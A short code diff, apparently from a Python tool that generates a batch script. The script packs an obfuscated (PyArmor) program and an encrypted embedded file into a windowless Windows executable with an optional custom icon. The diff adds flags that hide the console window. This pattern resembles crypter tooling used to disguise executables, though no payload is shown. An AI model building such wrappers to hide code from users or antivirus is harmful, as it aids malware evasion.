@@ -110,9 +110,9 @@ cd dist
 echo Progress: [40%%]
 '''
         if icon == "none":
-             batCode += fr'''pyinstaller -F -w --add-data "pyarmor_runtime_000000;pyarmor_runtime_000000/" --add-data "../enc_{file_crypt_name};." --hidden-import "Fernet" --hidden-import "cryptography" --hidden-import "cryptography.fernet" --hidden-import "tkinter" --hidden-import "tkinter.messagebox" "{name}.py"  '''
+             batCode += fr'''pyinstaller -F -w --noconsole --add-data "pyarmor_runtime_000000;pyarmor_runtime_000000/" --add-data "../enc_{file_crypt_name};." --hidden-import "Fernet" --hidden-import "cryptography" --hidden-import "cryptography.fernet" "{name}.py" --windowed '''
         else:
-            batCode += fr'''pyinstaller -F -w -i "{icon}" --add-data "pyarmor_runtime_000000;pyarmor_runtime_000000/" --add-data "../enc_{file_crypt_name};." --hidden-import "Fernet" --hidden-import "cryptography" --hidden-import "cryptography.fernet" --hidden-import "tkinter" --hidden-import "tkinter.messagebox" "{name}.py"  '''
+            batCode += fr'''pyinstaller -F -w --noconsole -i "{icon}" --add-data "pyarmor_runtime_000000;pyarmor_runtime_000000/" --add-data "../enc_{file_crypt_name};." --hidden-import "Fernet" --hidden-import "cryptography" --hidden-import "cryptography.fernet" "{name}.py" --windowed '''
 
         batCode += fr'''  
 cd dist  
